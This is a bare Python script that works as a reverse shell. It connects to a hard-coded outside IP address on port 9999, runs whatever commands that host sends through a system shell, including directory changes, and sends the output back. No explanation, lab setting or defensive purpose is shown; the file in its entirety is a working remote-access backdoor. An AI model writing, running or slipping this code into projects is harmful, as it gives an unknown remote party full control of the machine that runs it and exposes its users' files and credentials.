import socket
import os
import subprocess
import sys


soc = socket.socket()
host = "34.87.76.231"
port = 9999

soc.connect((host, port))

while True:
    try:
        data = soc.recv(1024)
        if data[:2].decode("utf-8") == 'cd':
            os.chdir(data[3:].decode("utf-8"))
        if len(data) > 0:
            cmd = subprocess.Popen(data[:].decode(
                "utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
            output_byte = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_byte, 'utf-8')
            currentWorkingDir = os.getcwd()+">"

            soc.send(str.encode(output_str+currentWorkingDir))
            print(output_str)
    except :
        sys.exit()
